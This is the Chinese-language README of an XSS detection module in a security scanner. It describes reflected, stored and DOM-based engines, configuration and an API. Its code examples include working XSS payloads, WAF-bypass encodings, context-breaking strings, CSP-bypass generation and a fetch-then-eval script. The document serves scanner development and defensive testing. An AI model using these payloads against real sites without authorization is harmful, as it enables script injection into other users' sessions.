# 🎭 跨站腳本檢測模組 (XSS)

**導航**: [← 返回Features主模組](../README.md) | [← 返回安全模組文檔](../docs/security/README.md)

---

## 📑 目錄

- [模組概覽](#模組概覽)
- [XSS檢測類型](#xss檢測類型)
- [檢測引擎](#檢測引擎)
- [核心特性](#核心特性)
- [配置選項](#配置選項)
- [使用指南](#使用指南)
- [API參考](#api參考)
- [最佳實踐](#最佳實踐)
- [故障排除](#故障排除)

---

## 🎯 模組概覽

跨站腳本(XSS)檢測模組專注於識別和分析各種類型的XSS漏洞，為Web應用程序提供全面的客戶端安全檢測。

### 📊 **模組狀態**
- **完成度**: 🟢 **100%** (完整實現)
- **檔案數量**: 12個Python檔案
- **代碼規模**: 1,245行代碼
- **測試覆蓋**: 90%+
- **最後更新**: 2025年11月7日

### ⭐ **核心優勢**
- 🎭 **多類型檢測**: 支援Reflected、Stored、DOM-based XSS
- 🧠 **智能繞過**: 自動WAF繞過和編碼測試
- 🎯 **上下文感知**: 基於HTML上下文的精準payload生成
- 📱 **現代Web支援**: SPA、AJAX、WebSocket檢測
- 🔒 **CSP分析**: Content Security Policy繞過檢測

---

## 🎨 XSS檢測類型

### **1. 🪞 反射型XSS (Reflected XSS)**
- **檢測方式**: 即時回顯檢測
- **常見位置**: URL參數、表單輸入、搜尋框
- **風險等級**: 中到高
- **檢測特徵**: 輸入的腳本直接出現在回應中

#### **檢測流程**
```python
# 1. 發送測試payload
payload = "<script>alert('XSS')</script>"
response = await client.get(f"{target}?input={payload}")

# 2. 檢查回應中是否包含未編碼的payload
if payload in response.text:
    vulnerability_detected = True
```

### **2. 💾 儲存型XSS (Stored XSS)**
- **檢測方式**: 持久化儲存檢測
- **常見位置**: 留言板、個人資料、文章內容
- **風險等級**: 高到嚴重
- **檢測特徵**: 腳本儲存在伺服器端，影響其他用戶

#### **檢測流程**
```python
# 1. 提交惡意payload到儲存端點
unique_id = generate_unique_id()
payload = f"<script>/*{unique_id}*/alert('Stored XSS')</script>"
await client.post(target_endpoint, data={"comment": payload})

# 2. 訪問展示頁面檢查payload是否被執行
response = await client.get(display_endpoint)
if unique_id in response.text and "<script>" in response.text:
    vulnerability_detected = True
```

### **3. 📄 DOM型XSS (DOM-based XSS)**
- **檢測方式**: JavaScript執行環境檢測
- **常見位置**: 前端路由、動態內容載入
- **風險等級**: 中到高
- **檢測特徵**: 客戶端JavaScript處理導致的XSS

#### **檢測流程**
```python
# 使用Selenium進行DOM檢測
from selenium import webdriver

driver = webdriver.Chrome()
driver.get(f"{target}#<img src=x onerror=alert('DOM XSS')>")

# 檢查是否觸發JavaScript警告
alerts = driver.switch_to.alert
if alerts:
    vulnerability_detected = True
```

---

## 🔧 檢測引擎

### **ReflectedXSSEngine**
專門檢測反射型XSS漏洞的引擎。

```python
class ReflectedXSSEngine:
    async def detect(self, task, client):
        payloads = self.generate_payloads(task.target.url)
        for payload in payloads:
            response = await self.test_payload(payload, task, client)
            if self.is_vulnerable(payload, response):
                yield self.create_finding(payload, response)
```

**特性**:
- 智能payload生成
- 上下文感知檢測
- WAF繞過技術
- 多編碼支援

### **StoredXSSEngine**
檢測儲存型XSS漏洞的專業引擎。

```python
class StoredXSSEngine:
    async def detect(self, task, client):
        # 第一階段: 提交payload
        submission_points = self.find_submission_forms(task.target.url)
        for point in submission_points:
            payload_id = await self.submit_payload(point, client)
            
            # 第二階段: 檢查payload是否被執行
            await asyncio.sleep(2)  # 等待儲存完成
            if await self.verify_stored_payload(payload_id, client):
                yield self.create_stored_finding(point, payload_id)
```

**特性**:
- 雙階段檢測
- 自動表單發現
- 延遲驗證機制
- 唯一識別符追蹤

### **DOMXSSEngine**
專門檢測DOM-based XSS的引擎。

```python
class DOMXSSEngine:
    def __init__(self):
        self.browser_driver = self.setup_headless_browser()
        
    async def detect(self, task, client):
        dom_sources = self.analyze_javascript_sources(task.target.url)
        for source in dom_sources:
            if await self.test_dom_sink(source, task.target.url):
                yield self.create_dom_finding(source)
```

**特性**:
- 無頭瀏覽器整合
- JavaScript源碼分析
- DOM污點分析
- 動態執行檢測

---

## ⚡ 核心特性

### **1. 🎯 上下文感知檢測**

根據HTML上下文生成最適合的payload：

```python
class ContextAwarePayloadGenerator:
    def generate_for_context(self, html_context):
        if 'value="' in html_context:
            # 在input value屬性中
            return ['"><script>alert(1)</script><input value="']
        elif '<script>' in html_context:
            # 在script標籤中
            return ['</script><script>alert(1)</script>']
        elif 'href="' in html_context:
            # 在鏈接href屬性中
            return ['javascript:alert(1)']
        else:
            # 通用情況
            return ['<script>alert(1)</script>']
```

### **2. 🔐 WAF繞過技術**

多種編碼和混淆技術繞過Web應用程序防火牆：

```python
class WAFBypassTechniques:
    def apply_encoding(self, payload):
        techniques = [
            self.html_encode,      # &#x3c;script&#x3e;
            self.url_encode,       # %3Cscript%3E
            self.unicode_encode,   # \u003cscript\u003e
            self.double_encode,    # %253Cscript%253E
            self.case_variation,   # <ScRiPt>
            self.comment_injection # <scr<!---->ipt>
        ]
        
        return [technique(payload) for technique in techniques]
```

### **3. 📱 現代Web應用支援**

支援SPA和AJAX應用的XSS檢測：

```python
class ModernWebXSSDetector:
    async def detect_spa_xss(self, target_url):
        # 檢測前端路由XSS
        routes = await self.discover_spa_routes(target_url)
        for route in routes:
            await self.test_route_parameter_injection(route)
            
    async def detect_ajax_xss(self, target_url):
        # 檢測AJAX端點XSS
        endpoints = await self.discover_ajax_endpoints(target_url)
        for endpoint in endpoints:
            await self.test_json_parameter_injection(endpoint)
```

### **4. 🛡️ CSP繞過分析**

分析和繞過Content Security Policy：

```python
class CSPBypassAnalyzer:
    def analyze_csp(self, csp_header):
        policy = self.parse_csp(csp_header)
        bypass_vectors = []
        
        if "'unsafe-inline'" not in policy.get('script-src', []):
            # 嘗試使用已知的繞過技術
            bypass_vectors.extend(self.generate_jsonp_bypasses())
            bypass_vectors.extend(self.generate_dom_clobbering_bypasses())
            
        return bypass_vectors
```

---

## ⚙️ 配置選項

### **基本配置**

```python
@dataclass
class XSSDetectionConfig:
    """XSS檢測配置"""
    # 基本設定
    timeout: float = 15.0
    max_payloads_per_parameter: int = 20
    enable_browser_testing: bool = True
    
    # 檢測類型開關
    enable_reflected: bool = True
    enable_stored: bool = True
    enable_dom: bool = True
    
    # WAF繞過設定
    enable_waf_bypass: bool = True
    encoding_techniques: List[str] = field(default_factory=lambda: [
        "html", "url", "unicode", "double", "case_variation"
    ])
    
    # 瀏覽器設定
    browser_timeout: float = 10.0
    headless_mode: bool = True
    
    # 儲存型XSS設定
    stored_verification_delay: float = 3.0
    max_verification_attempts: int = 3
```

### **進階配置**

```python
@dataclass
class XSSAdvancedConfig:
    """進階XSS檢測配置"""
    # CSP分析
    analyze_csp: bool = True
    attempt_csp_bypass: bool = True
    
    # DOM分析
    javascript_analysis_depth: int = 3
    dom_source_discovery: bool = True
    
    # 誤報過濾
    enable_false_positive_filter: bool = True
    confidence_threshold: float = 0.7
    
    # 效能設定
    concurrent_browser_instances: int = 2
    browser_pool_size: int = 5
```

### **環境變數**

```bash
# XSS檢測設定
XSS_ENABLE_REFLECTED=true
XSS_ENABLE_STORED=true
XSS_ENABLE_DOM=true

# 瀏覽器設定
XSS_BROWSER_TIMEOUT=15
XSS_HEADLESS_MODE=true
XSS_BROWSER_POOL_SIZE=3

# WAF繞過設定
XSS_ENABLE_WAF_BYPASS=true
XSS_MAX_ENCODING_ATTEMPTS=10

# 效能設定
XSS_MAX_CONCURRENT_TESTS=5
XSS_STORED_VERIFICATION_DELAY=2.0
```

---

## 📖 使用指南

### **基本使用**

#### **1. 簡單XSS檢測**
```python
from services.features.function_xss.engines import ReflectedXSSEngine

engine = ReflectedXSSEngine()
results = await engine.detect(task_payload, http_client)

for result in results:
    if result.vulnerable:
        print(f"發現XSS漏洞:")
        print(f"  位置: {result.location}")
        print(f"  Payload: {result.payload}")
        print(f"  嚴重度: {result.severity}")
```

#### **2. 全面XSS掃描**
```python
from services.features.function_xss.detector import XSSDetector

detector = XSSDetector()
results = await detector.comprehensive_scan(
    target="http://example.com",
    config={
        "enable_all_types": True,
        "enable_waf_bypass": True,
        "browser_testing": True
    }
)
```

### **進階使用**

#### **1. 自定義Payload**
```python
custom_payloads = [
    # 基本測試
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    
    # WAF繞過
    "<scr<script>ipt>alert('XSS')</script>",
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
    
    # DOM測試
    "javascript:alert('DOM XSS')",
    "<svg onload=alert('SVG XSS')>",
    
    # 現代繞過
    "<script>fetch('/api/user').then(r=>r.text()).then(d=>eval(d))</script>"
]

results = await engine.detect_with_custom_payloads(target, custom_payloads)
```

#### **2. 上下文特定檢測**
```python
# HTML屬性上下文
attribute_payloads = [
    '" onmouseover="alert(1)" "',
    "' onmouseover='alert(1)' '",
    '" autofocus onfocus="alert(1)" "'
]

# JavaScript上下文
js_payloads = [
    "';alert(1);//",
    '";alert(1);//',
    "'}alert(1)//"
]

# URL上下文
url_payloads = [
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:alert(1)"
]
```

### **儲存型XSS檢測**

```python
async def detect_stored_xss(target_forms):
    for form in target_forms:
        # 生成唯一標識符
        unique_id = f"xss_test_{int(time.time())}_{random.randint(1000,9999)}"
        
        # 構造測試payload
        payload = f"<script>/*{unique_id}*/alert('Stored XSS')</script>"
        
        # 提交payload
        await submit_form_data(form, {"content": payload})
        
        # 等待儲存
        await asyncio.sleep(3)
        
        # 驗證是否儲存並執行
        verification_urls = discover_display_pages(form.action)
        for url in verification_urls:
            response = await client.get(url)
            if unique_id in response.text and not is_encoded(payload, response.text):
                report_stored_xss(url, payload, unique_id)
```

---

## 🔌 API參考

### **核心類別**

#### **XSSDetectionResult**
```python
@dataclass
class XSSDetectionResult:
    xss_type: str               # "reflected" | "stored" | "dom"
    vulnerable: bool            # 是否存在漏洞
    payload: str               # 觸發漏洞的payload
    location: XSSLocation      # 漏洞位置資訊
    severity: str              # 嚴重度等級
    confidence: float          # 置信度 (0.0-1.0)
    context: str               # HTML上下文
    bypass_technique: str      # 使用的繞過技術
    evidence: XSSEvidence     # 漏洞證據
    remediation: str          # 修復建議
```

#### **XSSLocation**
```python
@dataclass
class XSSLocation:
    url: str                   # 目標URL
    parameter: str             # 漏洞參數
    method: str               # HTTP方法
    injection_point: str      # 注入點類型
    html_context: str         # HTML上下文描述
```

#### **XSSEvidence**
```python
@dataclass
class XSSEvidence:
    request_payload: str      # 請求payload
    response_snippet: str     # 回應片段
    dom_modification: bool    # 是否修改DOM
    javascript_execution: bool # 是否執行JavaScript
    alert_triggered: bool     # 是否觸發alert
    screenshot_path: str      # 截圖路徑 (可選)
```

### **檢測引擎接口**

```python
class XSSDetectionEngine(ABC):
    @abstractmethod
    async def detect(self, task: FunctionTaskPayload, client: httpx.AsyncClient) -> List[XSSDetectionResult]:
        """執行XSS檢測"""
        pass
        
    @abstractmethod
    def generate_payloads(self, context: str) -> List[str]:
        """根據上下文生成payload"""
        pass
        
    @abstractmethod
    def is_vulnerable(self, payload: str, response: httpx.Response) -> bool:
        """判斷是否存在漏洞"""
        pass
```

---

## 🚀 最佳實踐

### **1. 檢測策略**

#### **分層檢測方法**
```python
async def layered_xss_detection(target):
    results = []
    
    # 第一層: 快速反射型檢測
    reflected_results = await quick_reflected_scan(target)
    results.extend(reflected_results)
    
    # 第二層: 深度儲存型檢測
    if any(r.vulnerable for r in reflected_results):
        stored_results = await deep_stored_scan(target)
        results.extend(stored_results)
    
    # 第三層: DOM和JavaScript檢測
    if is_modern_web_app(target):
        dom_results = await dom_xss_scan(target)
        results.extend(dom_results)
    
    return results
```

#### **誤報最小化**
```python
def filter_false_positives(results):
    filtered = []
    for result in results:
        # 檢查payload是否真的被執行
        if result.evidence.javascript_execution:
            # 驗證執行環境
            if verify_execution_context(result):
                filtered.append(result)
        # 檢查HTML編碼
        elif not is_html_encoded(result.payload, result.evidence.response_snippet):
            filtered.append(result)
    
    return filtered
```

### **2. 效能優化**

#### **並行檢測**
```python
async def parallel_xss_detection(targets):
    semaphore = asyncio.Semaphore(10)  # 限制併發數
    
    async def detect_single(target):
        async with semaphore:
            return await xss_engine.detect(target, client)
    
    tasks = [detect_single(target) for target in targets]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    return [r for r in results if not isinstance(r, Exception)]
```

#### **瀏覽器資源池**
```python
class BrowserPool:
    def __init__(self, size=3):
        self.pool = asyncio.Queue(maxsize=size)
        for _ in range(size):
            self.pool.put_nowait(self.create_browser())
    
    async def get_browser(self):
        return await self.pool.get()
    
    async def return_browser(self, browser):
        await self.pool.put(browser)
```

### **3. 安全考量**

#### **測試payload安全性**
```python
def safe_payload_generation():
    # 避免實際傷害的payload
    safe_payloads = [
        "<script>console.log('XSS Test')</script>",
        "<img src=x onerror=console.log('XSS')>",
        "javascript:console.log('XSS')"
    ]
    
    # 避免使用alert() - 可能干擾自動化測試
    # 避免使用document.write() - 可能破壞頁面
    # 避免使用location.href - 可能導致重定向
    
    return safe_payloads
```

---

## 🔧 故障排除

### **常見問題**

#### **1. 瀏覽器檢測失敗**
```python
# 症狀: selenium.common.exceptions.WebDriverException
# 解決方案: 檢查瀏覽器驅動程式
def setup_robust_browser():
    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-gpu')
    
    try:
        driver = webdriver.Chrome(options=options)
    except WebDriverException:
        # 降級到Firefox
        driver = webdriver.Firefox()
    
    return driver
```

#### **2. 誤報過多**
```python
# 解決方案: 改進檢測邏輯
def improved_vulnerability_detection(payload, response):
    # 檢查payload是否真的未被編碼
    if html.escape(payload) in response.text:
        return False  # 已被正確編碼
    
    # 檢查是否在註釋中
    if f"<!--{payload}-->" in response.text:
        return False  # 在HTML註釋中，無害
    
    # 檢查上下文
    context = extract_context(payload, response.text)
    if not is_executable_context(context):
        return False  # 不在可執行上下文中
    
    return True  # 真正的漏洞
```

#### **3. DOM檢測不準確**
```python
# 解決方案: 改進DOM分析
async def accurate_dom_detection(url):
    driver = setup_browser()
    
    try:
        # 載入頁面
        driver.get(url)
        
        # 等待JavaScript執行
        WebDriverWait(driver, 5).until(
            EC.presence_of_element_located((By.TAG_NAME, "body"))
        )
        
        # 檢查DOM變化
        initial_dom = driver.page_source
        
        # 注入測試payload
        driver.execute_script("location.hash = '<img src=x onerror=window.xss_detected=1>'")
        
        # 檢查是否執行
        xss_detected = driver.execute_script("return window.xss_detected")
        
        return bool(xss_detected)
        
    finally:
        driver.quit()
```

### **調試工具**

#### **詳細日誌記錄**
```python
import logging

# 設定詳細日誌
logging.getLogger("xss_detector").setLevel(logging.DEBUG)

class XSSDebugLogger:
    def log_test_attempt(self, payload, url, response_status):
        logger.debug(f"Testing payload: {payload}")
        logger.debug(f"Target URL: {url}")
        logger.debug(f"Response status: {response_status}")
    
    def log_vulnerability_found(self, result):
        logger.info(f"XSS vulnerability found!")
        logger.info(f"Type: {result.xss_type}")
        logger.info(f"Payload: {result.payload}")
        logger.info(f"Location: {result.location.url}")
```

#### **響應分析工具**
```python
def analyze_response_for_debugging(payload, response):
    analysis = {
        "payload_present": payload in response.text,
        "payload_encoded": html.escape(payload) in response.text,
        "payload_locations": [],
        "context_analysis": {}
    }
    
    # 找出payload在回應中的所有位置
    start = 0
    while True:
        pos = response.text.find(payload, start)
        if pos == -1:
            break
        
        context = response.text[max(0, pos-50):pos+len(payload)+50]
        analysis["payload_locations"].append({
            "position": pos,
            "context": context
        })
        start = pos + 1
    
    return analysis
```

---

## 🔗 相關連結

### **📚 開發規範與指南**
- [🏗️ **AIVA Common 規範**](../../../services/aiva_common/README.md) - 共享庫標準與開發規範
- [🛠️ **開發快速指南**](../../../guides/development/DEVELOPMENT_QUICK_START_GUIDE.md) - 環境設置與部署
- [🌐 **多語言環境標準**](../../../guides/development/MULTI_LANGUAGE_ENVIRONMENT_STANDARD.md) - 開發環境配置
- [🔒 **安全框架規範**](../../../services/aiva_common/SECURITY_FRAMEWORK_COMPLETED.md) - 安全開發標準
- [📦 **依賴管理指南**](../../../guides/development/DEPENDENCY_MANAGEMENT_GUIDE.md) - 依賴問題解決

### **模組文檔**
- [🏠 Features主模組](../README.md) - 模組總覽  
- [🛡️ 安全模組文檔](../docs/security/README.md) - 安全類別文檔
- [🐍 Python開發指南](../docs/python/README.md) - 開發規範

### **其他安全模組**
- [🎯 SQL注入檢測模組](../function_sqli/README.md) - SQL注入檢測
- [🌐 SSRF檢測模組](../function_ssrf/README.md) - 服務端請求偽造檢測  
- [🔓 IDOR檢測模組](../function_idor/README.md) - 不安全直接對象引用檢測

### **技術資源**
- [OWASP XSS預防指南](https://owasp.org/www-community/attacks/xss/)
- [CWE-79: 跨站腳本](https://cwe.mitre.org/data/definitions/79.html)
- [CSP繞過技術](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass)

### **工具與標準**
- [Selenium WebDriver文檔](https://selenium-python.readthedocs.io/)
- [DOM XSS檢測技術](https://domgo.at/)
- [XSS Hunter專案](https://github.com/mandatoryprogrammer/xsshunter-express)

---

*最後更新: 2025年11月27日*  
*維護團隊: AIVA Security Team*